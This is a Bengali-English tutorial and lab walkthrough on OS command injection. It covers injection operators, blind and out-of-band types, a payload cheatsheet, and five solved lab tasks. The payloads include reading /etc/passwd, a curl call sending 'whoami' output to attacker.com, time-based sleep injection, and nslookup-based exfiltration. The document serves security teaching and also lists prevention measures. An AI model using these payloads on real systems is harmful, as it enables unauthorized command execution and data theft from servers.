# OS Command Injection
### 📌 OS Command Injection কী?

OS Command Injection (একে Shell Injection-ও বলা হয়) এমন একটি সিকিউরিটি ভালনারেবিলিটি যেখানে একজন অ্যাটাকার ওয়েব অ্যাপ্লিকেশনের মাধ্যমে সার্ভারের অপারেটিং সিস্টেমে সরাসরি কমান্ড এক্সিকিউট করতে পারে। এর ফলে সার্ভারের সম্পূর্ণ নিয়ন্ত্রণ নেওয়া বা সংবেদনশীল ডাটা চুরি করা সম্ভব।
<br>
![](images/OSCI1.png)<br><br>
---

### 🧠 Common Injection Operators

Attacker সাধারণত এগুলো use করে:

- `;` → next command  
- `&&` → first success হলে next run  
- `||` → first fail হলে next run  
- `|` → pipe output  
- `` `command` `` → command substitution  
- `$()` → command execution  


---

### 🔍 ইনজেকশনের প্রকারভেদ

| প্রকার | বিবরণ |
| --- | --- |
| **In-band (Classic)** | কমান্ডের রেজাল্ট সরাসরি ব্রাউজারে বা রেসপন্সে দেখা যায়। |
| **Blind (Time-based)** | আউটপুট দেখা যায় না, কিন্তু `sleep` বা `ping` কমান্ড দিয়ে সার্ভারের রেসপন্স টাইম দেখে ইনজেকশন নিশ্চিত করা হয়। |
| **Blind (Out-of-band)** | আউটপুট সরাসরি আসে না, তাই এক্সটার্নাল সার্ভারে (যেমন: DNS/HTTP) ডাটা পাঠানোর মাধ্যমে অ্যাটাক করা হয়। |

---
## 💻 Common Commands: Linux vs Windows

| Purpose of Command        | Linux Command | Windows Command   |
|--------------------------|--------------|------------------|
| Name of current user     | `whoami`     | `whoami`         |
| Operating system         | `uname -a`   | `ver`            |
| Network configuration    | `ifconfig`   | `ipconfig /all`  |
| Network connections      | `netstat -an`| `netstat -an`    |
| Running processes        | `ps -ef`     | `tasklist`       |

---

### 🚀 পেলোড উদাহরণ (Cheatsheet)

* **সিস্টেম তথ্য:** `; whoami`, `; id`, `; uname -a`
* **ফাইল দেখা:** `; cat /etc/passwd`
* **নেটওয়ার্ক কানেকশন:** `; ping -c 10 127.0.0.1`
* **ডাটা এক্সফিল্ট্রেশন:** `; curl http://attacker.com/$(whoami)`
---

### 🔍 Real-World Scenario

ধরো একটা web app file check করে:
`cat file.txt`<br>

Attacker দেয়:
`file.txt; whoami`<br>

👉 Execute হবে:
`cat file.txt; whoami`<br>
➡️ attacker জানতে পারবে server কোন user দিয়ে run হচ্ছে  

---
## 🛡️ Prevention

### 1️⃣ Input Validation
- Only allow expected values (whitelist)

### 2️⃣ Escaping
- Special characters block করা  

### 3️⃣ Avoid OS Command
- Direct system call না করে safer API ব্যবহার করা  

### 4️⃣ Use Parameterized Functions

যেমন:

- PHP → `escapeshellarg()`  
- Python → `subprocess.run([...])` *(string না, list use করো)*  
---

## **Task-1:**
![](images/OSCI2.png)<br><br>
সমাধান: রিকোয়েস্ট ইন্টারসেপ্ট করে storeID প্যারামিটারে 1;whoami পেলোডটি ব্যবহার করুন।<br>
ফলাফল: ; অপারেটর ব্যবহার করে সার্ভার whoami কমান্ড রান করে এবং ইউজারের নাম রেসপন্সে ফিরিয়ে দেয়।<br>

![](images/OSCI3.png)<br><br>

### Respons shows user name for using 1;whoami 
![](images/OSCI4.png)<br><br>

---

## **Task-2:**
![](images/OSCI5.png)<br><br>
সমাধান: ফিডব্যাক ফর্মে ইমেইল প্যারামিটারে email=x||ping+-c+10+127.0.0.1|| OR email=x||sleep+10|| or something পেলোডটি ইনজেক্ট করুন।<br>
ফলাফল: লজিক্যাল অপারেটর (||) ব্যবহার করায় সার্ভার ১০ সেকেন্ড বিরতি নেয় (Sleep), যা দেখে নিশ্চিত হওয়া যায় যে কমান্ডটি সফলভাবে কাজ করেছে।<br>

### submit feedback:
![](images/OSCI6.png)<br><br>

![](images/OSCI7.png)<br><br>

### for using email=x||sleep+10|| ,respons will show 10 seconds later(see left bottom time 10.283):
![](images/OSCI8.png)<br><br>

---

## **Task-3:**
![](images/OSCI9.png)<br><br>
১. পেলোড ইনজেকশন: ফিডব্যাক ফর্মে email প্যারামিটারে ||whoami>/var/www/images/output.txt|| ইনজেক্ট করে রেজাল্ট একটি টেক্সট ফাইলে সেভ করি।<br>
২. রিপিটার ব্যবহার: রিকোয়েস্টটি Burp Suite-এর Repeater-এ পাঠিয়ে Send করি যাতে ব্যাকএন্ডে ফাইলটি তৈরি হয়।<br>
৩. ইমেজ রিকোয়েস্ট ইন্টারসেপ্ট: ব্রাউজারে যেকোনো একটি প্রোডাক্ট ইমেজ ওপেন করে তার রিকোয়েস্টটি (GET /image?filename=...) ক্যাপচার করি।<br>
৪. ফাইল রিড: ইমেজের রিকোয়েস্টটি Repeater-এ নিয়ে filename পরিবর্তন করে output.txt লিখে Send করি।<br>
৫. ফলাফল: রেসপন্স বডিতে কমান্ডের আউটপুট (যেমন: peter-L5GNpM) সরাসরি দেখা যায়।<br>
৬. কেন এটি কাজ করে: অ্যাপ্লিকেশনের ইমেজ ডিরেক্টরি রাইট-অ্যাবল (Writable) হওয়ায় আমরা কমান্ডের আউটপুট সেখানে সেভ করে পরে ইউআরএল-এর মাধ্যমে তা অ্যাক্সেস করতে পেরেছি।<br>

![](images/OSCI10.png)<br><br>
![](images/OSCI11.png)<br><br>
![](images/OSCI12.png)<br><br>
`Right click mouse and open images in new tab`<br>
![](images/OSCI13.png)<br><br>
`change the filename = output.txt or this can also done by Burpsuit`<br><br>
![](images/OSCI14.png)<br><br>
`Got it`<br>
![](images/OSCI15.png)<br><br>

---

## **Task-4:**
![](images/OSCI16.png)<br><br>
সমাধান: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN|| পেলোডটি ইমেইল প্যারামিটারে ব্যবহার করুন।<br>
ফলাফল: সার্ভার যখন Burp Collaborator-এ একটি DNS রিকোয়েস্ট পাঠাবে, তখন নিশ্চিত হওয়া যায় যে কমান্ড ইনজেকশন সফল হয়েছে।<br>
![](images/OSCI17.png)<br><br>
`copy clipboard`<br>
![](images/OSCI18.png)<br><br>
`it can be solve by nslookup, curl, wget...`<br>
![](images/OSCI19.png)<br><br>
![](images/OSCI20.png)<br><br>

---

## **Task-5:**
![](images/OSCI21.png)<br><br>
ভ্যালনারেবিলিটি: এটি সবচেয়ে অ্যাডভান্সড ধাপ, যেখানে এক্সটার্নাল সার্ভারে সরাসরি কনফিডেনশিয়াল ডাটা পাচার (Exfiltrate) করা হয়।<br>
সমাধান: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| পেলোডটি ব্যবহার করুন।<br>
ফলাফল: whoami কমান্ডের রেজাল্টটি (যেমন: peter) সাব-ডোমেইন হিসেবে আপনার সার্ভারে চলে আসবে, যা দিয়ে আপনি সরাসরি ডাটা চুরি করতে পারবেন।<br>
![](images/OSCI22.png)<br><br>
![](images/OSCI23.png)<br><br>
![](images/OSCI24.png)<br><br>
![](images/OSCI25.png)<br><br>
`Also use curl, nslookup, wget...etc`<br>
![](images/OSCI26.png)<br><br>
![](images/OSCI27.png)<br><br>
###Done

